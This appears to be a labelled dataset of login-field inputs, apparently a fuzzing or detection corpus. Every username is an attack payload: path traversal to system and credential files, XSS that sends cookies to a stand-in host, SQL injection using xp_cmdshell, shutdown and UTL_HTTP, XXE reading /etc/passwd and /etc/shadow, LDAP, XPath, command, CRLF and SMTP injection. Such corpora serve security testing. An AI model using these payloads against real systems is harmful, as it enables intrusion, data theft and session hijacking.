|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/conf\/server.xml","password":"763502376"}|,1
|{"username":"C:\/inetpub\/wwwroot\/global.asa","password":"88658718"}|,1
|{"username":"C:inetpubwwwrootglobal.asa","password":"540860709"}|,1
|{"username":"C:\/boot.ini","password":"1500012614"}|,1
|{"username":"C:boot.ini","password":"1001419915"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/localstart.asp%00","password":"803146333"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/localstart.asp","password":"1557764826"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini%00","password":"947334683"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini","password":"1865858163"}|,1
|{"username":"\/.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/boot.ini","password":"1201449128"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini%00","password":"530717841"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini","password":"2023313846"}|,1
|{"username":"\/....\/....\/....\/....\/....\/....\/boot.ini","password":"405710446"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/boot.ini","password":"1946452084"}|,1
|{"username":"....................boot.ini","password":"1202634560"}|,1
|{"username":"....................boot.ini%00","password":"921535575"}|,1
|{"username":"....................boot.ini","password":"1274508871"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini%00.html","password":"1393379797"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini%00.jpg","password":"430016994"}|,1
|{"username":"\/...\/...\/...\/...\/...\/","password":"243234944"}|,1
|{"username":"..%c0%af..\/..%c0%af..\/..%c0%af..\/..%c0%af..\/..%c0%af..\/..%c0%af..\/boot.ini","password":"1727443991"}|,1
|{"username":"\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/boot.ini","password":"859815659"}|,1
|{"username":"%0d%0aX-Injection-Header:%20AttackValue","password":"341027371"}|,1
|{"username":"!@#0%^#0##018387@#0^^**(()","password":"766287598"}|,1
|{"username":"%01%02%03%04%0a%0d%0aADSF","password":"1876519788"}|,1
|{"username":"\/,%ENV,\/","password":"1337879439"}|,1
|{"username":"&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;","password":"1576922764"}|,1
|{"username":"&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;","password":"1694339568"}|,1
|{"username":"%","password":"1370402224"}|,1
|{"username":"#","password":"1601271102"}|,1
|{"username":"*","password":"1651520197"}|,1
|{"username":"}","password":"854881015"}|,1
|{"username":";","password":"811932452"}|,1
|{"username":"\/","password":"466941540"}|,1
|{"username":"","password":"63169960"}|,1
|{"username":"","password":"1084167468"}|,1
|{"username":"\/","password":"1519176532"}|,1
|{"username":"*","password":"210968055"}|,1
|{"username":"?","password":"527431624"}|,1
|{"username":"&lt","password":"1199434824"}|,1
|{"username":"&lt;","password":"2031684749"}|,1
|{"username":"&LT","password":"1222591560"}|,1
|{"username":"&LT;","password":"1727319242"}|,1
|{"username":"<","password":"392680163"}|,1
|{"username":"<<","password":"21293469"}|,1
|{"username":"<<<","password":"1556028540"}|,1
|{"username":"","password":"1343111722"}|,1
|{"username":"","password":"549534041"}|,1
|{"username":"`","password":"188441548"}|,1
|{"username":"-","password":"1667923601"}|,1
|{"username":"--","password":"1767848052"}|,1
|{"username":"*","password":"1639598459"}|,1
|{"username":"^'","password":"1116079072"}|,1
|{"username":"'","password":"168569192"}|,1
|{"username":"\/'","password":"853501937"}|,1
|{"username":"@'","password":"2051170364"}|,1
|{"username":"(')","password":"1895114994"}|,1
|{"username":"{'}","password":"1922056758"}|,1
|{"username":"[']","password":"1770976473"}|,1
|{"username":"*'","password":"1811024123"}|,1
|{"username":"#'","password":"1373707216"}|,1
|{"username":"!'","password":"2010908905"}|,1
|{"username":"!@#$%%^#$%#$@#$%$$@#$%^^**(()","password":"1724416106"}|,1
|{"username":"%01%02%03%04%0a%0d%0aADSF","password":"264587061"}|,1
|{"username":"t","password":"1697412578"}|,1
|{"username":"t","password":"1823320473"}|,1
|{"username":"&#10;","password":"1211381394"}|,1
|{"username":"&#13;","password":"2086252553"}|,1
|{"username":"&#10;&#13;","password":"1883282124"}|,1
|{"username":"&#13;&#10;","password":"118467092"}|,1
|{"username":"#xD","password":"1549842690"}|,1
|{"username":"#xA","password":"1063540816"}|,1
|{"username":"#xD#xA","password":"865948173"}|,1
|{"username":"#xA#xD","password":"1378065817"}|,1
|{"username":"\/%00\/","password":"359033842"}|,1
|{"username":"%00\/","password":"504852431"}|,1
|{"username":"%00","password":"1279980064"}|,1
|{"username":"<?","password":"2095830855"}|,1
|{"username":"%3C","password":"744994129"}|,1
|{"username":"%3C%3F","password":"320491248"}|,1
|{"username":"%60","password":"2142251364"}|,1
|{"username":"%5C","password":"1027388723"}|,1
|{"username":"%5C\/","password":"1505898020"}|,1
|{"username":"%7C","password":"1849962270"}|,1
|{"username":"%00","password":"1980906697"}|,1
|{"username":"\/%2A","password":"11921738"}|,1
|{"username":"%2A","password":"1886285590"}|,1
|{"username":"%2C","password":"643363260"}|,1
|{"username":"%20","password":"1760923250"}|,1
|{"username":"%20","password":"159483243"}|,1
|{"username":"%250a","password":"1336536121"}|,1
|{"username":"%2500","password":"1744603421"}|,1
|{"username":"..\/","password":"587475229"}|,1
|{"username":"%2e%2e%2f","password":"863891148"}|,1
|{"username":"..%u2215","password":"1973211255"}|,1
|{"username":"..%c0%af","password":"20775844"}|,1
|{"username":"..%bg%qf","password":"1645659101"}|,1
|{"username":"..","password":"1462732181"}|,1
|{"username":"..%5c","password":"842751232"}|,1
|{"username":"..%%35c","password":"345456643"}|,1
|{"username":"..%255c","password":"344647146"}|,1
|{"username":"..%%35%63","password":"1404342816"}|,1
|{"username":"..%25%35%63","password":"813735564"}|,1
|{"username":"..%u2216","password":"69974456"}|,1
|{"username":"&#60","password":"118080911"}|,1
|{"username":"&#060","password":"704307236"}|,1
|{"username":"&#0060","password":"773650286"}|,1
|{"username":"&#00060","password":"1885496902"}|,1
|{"username":"&#000060","password":"1957018997"}|,1
|{"username":"&#0000060","password":"348649506"}|,1
|{"username":"&#60;","password":"771190300"}|,1
|{"username":"&#060;","password":"1946767786"}|,1
|{"username":"&#0060;","password":"1177062629"}|,1
|{"username":"&#00060;","password":"1450485225"}|,1
|{"username":"&#000060;","password":"1816256406"}|,1
|{"username":"&#0000060;","password":"346318493"}|,1
|{"username":"&#x3c","password":"505010885"}|,1
|{"username":"&#x03c","password":"2021937483"}|,1
|{"username":"&#x003c","password":"431164011"}|,1
|{"username":"&#x0003c","password":"1685490840"}|,1
|{"username":"&#x00003c","password":"2084518530"}|,1
|{"username":"&#x000003c","password":"568018134"}|,1
|{"username":"&#x3c;","password":"325329303"}|,1
|{"username":"&#x03c;","password":"1723798881"}|,1
|{"username":"&#x003c;","password":"929414618"}|,1
|{"username":"&#x0003c;","password":"1952722916"}|,1
|{"username":"&#x00003c;","password":"476065587"}|,1
|{"username":"&#x000003c;","password":"2057025"}|,1
|{"username":"&#X3c","password":"1552338209"}|,1
|{"username":"&#X03c","password":"338257998"}|,1
|{"username":"&#X003c","password":"1006676977"}|,1
|{"username":"&#X0003c","password":"1964731530"}|,1
|{"username":"&#X00003c","password":"1253079623"}|,1
|{"username":"&#X000003c","password":"399537486"}|,1
|{"username":"&#X3c;","password":"2123327749"}|,1
|{"username":"&#X03c;","password":"737908548"}|,1
|{"username":"&#X003c;","password":"213653159"}|,1
|{"username":"&#X0003c;","password":"1435923564"}|,1
|{"username":"&#X00003c;","password":"1731881359"}|,1
|{"username":"&#X000003c;","password":"1276599461"}|,1
|{"username":"&#x3C","password":"1385755099"}|,1
|{"username":"&#x03C","password":"788688"}|,1
|{"username":"&#x003C","password":"833827910"}|,1
|{"username":"&#x0003C","password":"1412273744"}|,1
|{"username":"&#x00003C","password":"1535776590"}|,1
|{"username":"&#x000003C","password":"1537251982"}|,1
|{"username":"&#x3C;","password":"567540792"}|,1
|{"username":"&#x03C;","password":"1284473651"}|,1
|{"username":"&#x003C;","password":"1195118389"}|,1
|{"username":"&#x0003C;","password":"1626892762"}|,1
|{"username":"&#x00003C;","password":"1663248606"}|,1
|{"username":"&#x000003C;","password":"1771205265"}|,1
|{"username":"&#X3C","password":"1031568170"}|,1
|{"username":"&#X03C","password":"1304744039"}|,1
|{"username":"&#X003C","password":"408421760"}|,1
|{"username":"&#X0003C","password":"1924112659"}|,1
|{"username":"&#X00003C","password":"1079013513"}|,1
|{"username":"&#X000003C","password":"1237420330"}|,1
|{"username":"&#X3C;","password":"1288043485"}|,1
|{"username":"&#X03C;","password":"312841642"}|,1
|{"username":"&#X003C;","password":"228241649"}|,1
|{"username":"&#X0003C;","password":"771593261"}|,1
|{"username":"&#X00003C;","password":"333158693"}|,1
|{"username":"&#X000003C;","password":"1618760999"}|,1
|{"username":"x3c","password":"1489456176"}|,1
|{"username":"x3C","password":"953942417"}|,1
|{"username":"u003c","password":"693688163"}|,1
|{"username":"u003C","password":"777525143"}|,1
|{"username":"something%00html","password":"1474641123"}|,1
|{"username":"&apos;","password":"1078347858"}|,1
|{"username":"\/&apos;","password":"132665334"}|,1
|{"username":"&apos;","password":"1216570968"}|,1
|{"username":"^&apos;","password":"290056124"}|,1
|{"username":"@&apos;","password":"1302048197"}|,1
|{"username":"{&apos;}","password":"299735741"}|,1
|{"username":"[&apos;]","password":"2083729842"}|,1
|{"username":"*&apos;","password":"1881673871"}|,1
|{"username":"#&apos;","password":"1060539206"}|,1
|{"username":">xxx<P>yyy","password":"188022291"}|,1
|{"username":"><script>","password":"1539646283"}|,1
|{"username":"<script>alert(XSS)<\/script>","password":"1385182124"}|,1
|{"username":"<<script>alert(XSS);\/\/<<\/script>","password":"1339075583"}|,1
|{"username":"<script>alert(document.cookie)<\/script>","password":"954422283"}|,1
|{"username":"'><script>alert(document.cookie)<\/script>","password":"2072929094"}|,1
|{"username":"'><script>alert(document.cookie);<\/script>","password":"822493039"}|,1
|{"username":";alert('XSS');\/\/","password":"1382955359"}|,1
|{"username":"%3cscript%3ealert(XSS);%3c\/script%3e","password":"933163360"}|,1
|{"username":"%3cscript%3ealert(document.cookie);%3c%2fscript%3e","password":"2095819231"}|,1
|{"username":"%3Cscript%3Ealert(%22X%20SS%22);%3C\/script%3E","password":"2138599373"}|,1
|{"username":"&ltscript&gtalert(document.cookie);<\/script>","password":"199215090"}|,1
|{"username":"&ltscript&gtalert(document.cookie);&ltscript&gtalert","password":"1806378682"}|,1
|{"username":"<xss><script>alert('XSS')<\/script><\/vulnerable>","password":"1123716476"}|,1
|{"username":"<IMG%20SRC='javascript:alert(document.cookie)'>","password":"147880079"}|,1
|{"username":"<IMG SRC=javascript:alert('XSS');>","password":"1419039717"}|,1
|{"username":"<IMG SRC=javascript:alert('XSS')","password":"1048357812"}|,1
|{"username":"<IMG SRC=javascript:alert('XSS')>","password":"614161838"}|,1
|{"username":"<IMG SRC=JaVaScRiPt:alert('XSS')>","password":"1815113642"}|,1
|{"username":"<IMG SRC=javascript:alert(&quot;XSS&quot;)>","password":"1362550558"}|,1
|{"username":"<IMG SRC=`javascript:alert('XSS')`>","password":"2070301215"}|,1
|{"username":"<IMG ><SCRIPT>alert(XSS)<\/SCRIPT>>","password":"581834173"}|,1
|{"username":"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","password":"843563819"}|,1
|{"username":"<IMG%20SRC='javasc	ript:alert(document.cookie)'>","password":"1937499296"}|,1
|{"username":"<IMG SRC=jav	ascript:alert('XSS');>","password":"1957316175"}|,1
|{"username":"<IMG SRC=jav&#x09;ascript:alert('XSS');>","password":"116770531"}|,1
|{"username":"<IMG SRC=jav&#x0A;ascript:alert('XSS');>","password":"1494227428"}|,1
|{"username":"<IMG SRC=jav&#x0D;ascript:alert('XSS');>","password":"446677638"}|,1
|{"username":"<IMG SRC= &#14;  javascript:alert('XSS');>","password":"1481149141"}|,1
|{"username":"<IMG DYNSRC=javascript:alert('XSS')>","password":"1877003620"}|,1
|{"username":"<IMG LOWSRC=javascript:alert('XSS')>","password":"1005008298"}|,1
|{"username":"<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>","password":"472175565"}|,1
|{"username":"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>","password":"42438788"}|,1
|{"username":"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>","password":"18474307"}|,1
|{"username":"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>","password":"1049398039"}|,1
|{"username":"'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C\/IFRAME%3E","password":"1895880849"}|,1
|{"username":"><script>document.location='http:\/\/your.site.com\/cgi-bin\/cookie.cgi?'+document.cookie<\/script>","password":"1075143165"}|,1
|{"username":"%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E","password":"1036649713"}|,1
|{"username":"';alert(String.fromCharCode(88,83,83))\/\/';alert(String.fromCharCode(88,83,83))\/\/;alert(String.fromCharCode(88,83,83))\/\/;alert(String.fromCharCode(88,83,83))\/\/><\/SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>=&{}","password":"1964654625"}|,1
|{"username":"'';!--<XSS>=&{()}","password":"407713246"}|,1
|{"username":"","password":"796267960"}|,1
|{"username":"'","password":"106500817"}|,1
|{"username":"","password":"20779057"}|,1
|{"username":"#","password":"745352579"}|,1
|{"username":"-","password":"786409417"}|,1
|{"username":"--","password":"1275426033"}|,1
|{"username":"' --","password":"1419452823"}|,1
|{"username":"--';","password":"1156432505"}|,1
|{"username":"' ;","password":"1068690889"}|,1
|{"username":"= '","password":"1018500054"}|,1
|{"username":"= ;","password":"253690385"}|,1
|{"username":"= --","password":"1833057550"}|,1
|{"username":"x23","password":"268616200"}|,1
|{"username":"x27","password":"519123313"}|,1
|{"username":"x3D x3B'","password":"1137721638"}|,1
|{"username":"x3D x27","password":"1753671765"}|,1
|{"username":"x27x4Fx52 SELECT *","password":"696082464"}|,1
|{"username":"x27x6Fx72 SELECT *","password":"1595166475"}|,1
|{"username":"'or select *","password":"1529243055"}|,1
|{"username":"admin'--","password":"837651752"}|,1
|{"username":"';shutdown--","password":"578701666"}|,1
|{"username":"<>'%;)(&+","password":"375815401"}|,1
|{"username":"' or ''='","password":"2049289865"}|,1
|{"username":"' or 'x'='x","password":"1203643387"}|,1
|{"username":" or x=x","password":"1090810933"}|,1
|{"username":"') or ('x'='x","password":"1666423808"}|,1
|{"username":"0 or 1=1","password":"156776302"}|,1
|{"username":"' or 0=0 --","password":"1787904375"}|,1
|{"username":" or 0=0 --","password":"74318437"}|,1
|{"username":"or 0=0 --","password":"399482877"}|,1
|{"username":"' or 0=0 #","password":"343896552"}|,1
|{"username":" or 0=0 #","password":"11708099"}|,1
|{"username":"or 0=0 #","password":"796990860"}|,1
|{"username":"' or 1=1--","password":"1407400396"}|,1
|{"username":" or 1=1--","password":"566282598"}|,1
|{"username":"' or '1'='1'--","password":"1963800398"}|,1
|{"username":"' or 1 --'","password":"561055116"}|,1
|{"username":"or 1=1--","password":"98211240"}|,1
|{"username":"or%201=1","password":"1151089879"}|,1
|{"username":"or%201=1 --","password":"681890142"}|,1
|{"username":"' or 1=1 or ''='","password":"844801355"}|,1
|{"username":" or 1=1 or =","password":"337794923"}|,1
|{"username":"' or a=a--","password":"1525470396"}|,1
|{"username":" or a=a","password":"462649087"}|,1
|{"username":"') or ('a'='a","password":"1623313235"}|,1
|{"username":") or (a=a","password":"1319434395"}|,1
|{"username":"hi or a=a","password":"203559365"}|,1
|{"username":"hi or 1=1 --","password":"1670799122"}|,1
|{"username":"hi' or 1=1 --","password":"1028236316"}|,1
|{"username":"hi' or 'a'='a","password":"1443209921"}|,1
|{"username":"hi') or ('a'='a","password":"1199798385"}|,1
|{"username":"hi) or (a=a","password":"1627460337"}|,1
|{"username":"'hi' or 'x'='x';","password":"1654890305"}|,1
|{"username":"@variable","password":"1127002873"}|,1
|{"username":",@variable","password":"1976495227"}|,1
|{"username":"PRINT","password":"420452559"}|,1
|{"username":"PRINT @@variable","password":"204694599"}|,1
|{"username":"select","password":"964619317"}|,1
|{"username":"insert","password":"1802025293"}|,1
|{"username":"as","password":"1267469256"}|,1
|{"username":"or","password":"1118649731"}|,1
|{"username":"procedure","password":"1779032095"}|,1
|{"username":"limit","password":"1082114068"}|,1
|{"username":"order by","password":"669208012"}|,1
|{"username":"asc","password":"674603502"}|,1
|{"username":"desc","password":"241982286"}|,1
|{"username":"delete","password":"1036066690"}|,1
|{"username":"update","password":"1008699451"}|,1
|{"username":"distinct","password":"2100324362"}|,1
|{"username":"having","password":"1321404887"}|,1
|{"username":"truncate","password":"1192616649"}|,1
|{"username":"replace","password":"597871224"}|,1
|{"username":"like","password":"444076596"}|,1
|{"username":"handler","password":"847352913"}|,1
|{"username":"bfilename","password":"2140334044"}|,1
|{"username":"' or username like '%","password":"240906743"}|,1
|{"username":"' or uname like '%","password":"997828652"}|,1
|{"username":"' or userid like '%","password":"1586640778"}|,1
|{"username":"' or uid like '%","password":"1727813799"}|,1
|{"username":"' or user like '%","password":"1918860185"}|,1
|{"username":"exec xp","password":"1462864443"}|,1
|{"username":"exec sp","password":"633460827"}|,1
|{"username":"'; exec master..xp_cmdshell","password":"759668059"}|,1
|{"username":"'; exec xp_regread","password":"778592163"}|,1
|{"username":"t'exec master..xp_cmdshell 'nslookup www.google.com'--","password":"1347168139"}|,1
|{"username":"--sp_password","password":"863919862"}|,1
|{"username":"x27UNION SELECT","password":"504301441"}|,1
|{"username":"' UNION SELECT","password":"1817471634"}|,1
|{"username":"' UNION ALL SELECT","password":"1578388816"}|,1
|{"username":"' or (EXISTS)","password":"145830039"}|,1
|{"username":"' (select top 1","password":"1759105799"}|,1
|{"username":"'UTL_HTTP.REQUEST","password":"1743919446"}|,1
|{"username":"1;SELECT%20*","password":"443669594"}|,1
|{"username":"to_timestamp_tz","password":"2031104270"}|,1
|{"username":"tz_offset","password":"1710724058"}|,1
|{"username":"&lt;&gt;&quot;'%;)(&amp;+","password":"1213252907"}|,1
|{"username":"'%20or%201=1","password":"1403164502"}|,1
|{"username":"%27%20or%201=1","password":"856262384"}|,1
|{"username":"%20$(sleep%2050)","password":"1935529232"}|,1
|{"username":"%20'sleep%2050'","password":"1381330949"}|,1
|{"username":"char%4039%41%2b%40SELECT","password":"283367705"}|,1
|{"username":"&apos;%20OR","password":"1342343561"}|,1
|{"username":"'sqlattempt1","password":"1717958407"}|,1
|{"username":"(sqlattempt2)","password":"1854315076"}|,1
|{"username":"","password":"250593272"}|,1
|{"username":"%7C","password":"601927161"}|,1
|{"username":"*","password":"1183383741"}|,1
|{"username":"%2A%7C","password":"807537392"}|,1
|{"username":"*((mail=*))","password":"1134152476"}|,1
|{"username":"%2A%28%7C%28mail%3D%2A%29%29","password":"1735588484"}|,1
|{"username":"*((objectclass=*))","password":"1570107554"}|,1
|{"username":"%2A%28%7C%28objectclass%3D%2A%29%29","password":"765537468"}|,1
|{"username":"(","password":"1384289165"}|,1
|{"username":"%28","password":"2030648755"}|,1
|{"username":")","password":"1952088460"}|,1
|{"username":"%29","password":"485188904"}|,1
|{"username":"&","password":"1019364036"}|,1
|{"username":"%26","password":"303521905"}|,1
|{"username":"!","password":"1469523520"}|,1
|{"username":"%21","password":"1958167287"}|,1
|{"username":"' or 1=1 or ''='","password":"1885164492"}|,1
|{"username":"' or ''='","password":"1366078703"}|,1
|{"username":"x' or 1=1 or 'x'='y","password":"1577794282"}|,1
|{"username":"\/","password":"1954494323"}|,1
|{"username":"\/\/","password":"1709782735"}|,1
|{"username":"\/\/*","password":"1596180850"}|,1
|{"username":"*\/*","password":"154201630"}|,1
|{"username":"@*","password":"560455973"}|,1
|{"username":"count(\/child::node())","password":"1284112502"}|,1
|{"username":"x' or name()='username' or 'x'='y","password":"927081137"}|,1
|{"username":"<name>','')); phpinfo(); exit;\/*<\/name>","password":"985225888"}|,1
|{"username":"<![CDATA[<script>var n=0;while(true){n++;}<\/script>]]>","password":"141566268"}|,1
|{"username":"<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>\/SCRIPT<![CDATA[>]]>","password":"1798595193"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>\/SCRIPT<![CDATA[>]]><\/foo>","password":"346482850"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><foo><![CDATA[' or 1=1 or ''=']]><\/foo>","password":"1635492480"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/c:\/boot.ini>]><foo>&xxe;<\/foo>","password":"120520882"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/etc\/passwd>]><foo>&xxe;<\/foo>","password":"1062986067"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/etc\/shadow>]><foo>&xxe;<\/foo>","password":"1052836630"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/dev\/random>]><foo>&xxe;<\/foo>","password":"527998891"}|,1
|{"username":"<xml ID=I><X><C><![CDATA[<IMG SRC=javas]]><![CDATA[cript:alert('XSS');>]]>","password":"745240978"}|,1
|{"username":"<xml ID=xss><I><B>&lt;IMG SRC=javas<!-- -->cript:alert('XSS')&gt;<\/B><\/I><\/xml><SPAN DATASRC=#xss DATAFLD=B DATAFORMATAS=HTML><\/SPAN><\/C><\/X><\/xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><\/SPAN>","password":"1828019768"}|,1
|{"username":"<xml SRC=xsstest.xml ID=I><\/xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><\/SPAN>","password":"1844247696"}|,1
|{"username":"<HTML xmlns:xss><?import namespace=xss implementation=http:\/\/ha.ckers.org\/xss.htc><xss:xss>XSS<\/xss:xss><\/HTML>","password":"683319158"}|,1
|{"username":"","password":"1990283979"}|,1
|{"username":"'","password":"723206132"}|,1
|{"username":"'--","password":"993568331"}|,1
|{"username":"' or 1=1--","password":"359630281"}|,1
|{"username":"1 or 1=1--","password":"560504486"}|,1
|{"username":"' or 1 in (@@version)--","password":"79015810"}|,1
|{"username":"1 or 1 in (@@version)--","password":"1225535154"}|,1
|{"username":"'; waitfor delay '0:30:0'--","password":"193888871"}|,1
|{"username":"1; waitfor delay '0:30:0'--","password":"1099642597"}|,1
|{"username":"'Utl_Http.request('http:\/\/<yourservername>') from dual--","password":"1534222511"}|,1
|{"username":"1Utl_Http.request('http:\/\/<yourservername>') from dual--","password":"2124845592"}|,1
|{"username":"xsstest","password":"1643650104"}|,1
|{"username":"xsstest%00<>'","password":"1064772649"}|,1
|{"username":"<\/foo>","password":"1912032926"}|,1
|{"username":"<foo><\/foo>","password":"1910947731"}|,1
|{"username":"))))))))))","password":"144532341"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/boot.ini","password":"801896069"}|,1
|{"username":"....................boot.ini","password":"447725531"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/windows\/win.ini","password":"622927768"}|,1
|{"username":"....................windowswin.ini","password":"1670908537"}|,1
|{"username":" ping -i 30 127.0.0.1 ; x  ping -n 30 127.0.0.1 &","password":"207071339"}|,1
|{"username":" ping -i 30 127.0.0.1 ","password":"750362596"}|,1
|{"username":" ping -n 30 127.0.0.1 ","password":"1428541286"}|,1
|{"username":"& ping -i 30 127.0.0.1 &","password":"1114425922"}|,1
|{"username":"& ping -n 30 127.0.0.1 &","password":"1037806315"}|,1
|{"username":"; ping 127.0.0.1 ;","password":"395156275"}|,1
|{"username":"%0a ping -i 30 127.0.0.1 %0a","password":"1831567578"}|,1
|{"username":"`ping 127.0.0.1`","password":"1569686484"}|,1
|{"username":";echo 111111","password":"2114011053"}|,1
|{"username":"echo 111111","password":"1923006661"}|,1
|{"username":"response.write 111111","password":"724282542"}|,1
|{"username":":response.write 111111","password":"130147519"}|,1
|{"username":"http:\/\/<yourservername>\/","password":"40916796"}|,1
|{"username":"<youremail>%0aCc:<youremail>","password":"682759545"}|,1
|{"username":"<youremail>%0d%0aCc:<youremail>","password":"1734993950"}|,1
|{"username":"<youremail>%0aBcc:<youremail>","password":"1231288191"}|,1
|{"username":"<youremail>%0d%0aBcc:<youremail>","password":"716214404"}|,1
|{"username":"%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a","password":"1236550569"}|,1
|{"username":"%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a","password":"1741180791"}|,1
|{"username":"# known cross platform source Code, file disclosure attack patterns - append after file or dir path","password":"481440163"}|,1
|{"username":"%70","password":"58577348"}|,1
|{"username":".%E2%73%70","password":"733192266"}|,1
|{"username":"%2e0","password":"2033066938"}|,1
|{"username":"%2e","password":"754827404"}|,1
|{"username":".","password":"1821233248"}|,1
|{"username":"","password":"850316393"}|,1
|{"username":"?*","password":"570719831"}|,1
|{"username":"%20","password":"355971603"}|,1
|{"username":"%00","password":"1299521983"}|,1
|{"username":"%2f","password":"908304289"}|,1
|{"username":"%5c","password":"1873586469"}|,1
|{"username":"count(\/child::node())","password":"297515447"}|,1
|{"username":"x' or name()='username' or 'x'='y","password":"1205092000"}|,1
|{"username":"<![CDATA[<script>var n=0;while(true){n++;}<\/script>]]>","password":"173339159"}|,1
|{"username":"<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>\/SCRIPT<![CDATA[>]]>","password":"476247819"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>\/SCRIPT<![CDATA[>]]><\/foo>","password":"1239921383"}|,1
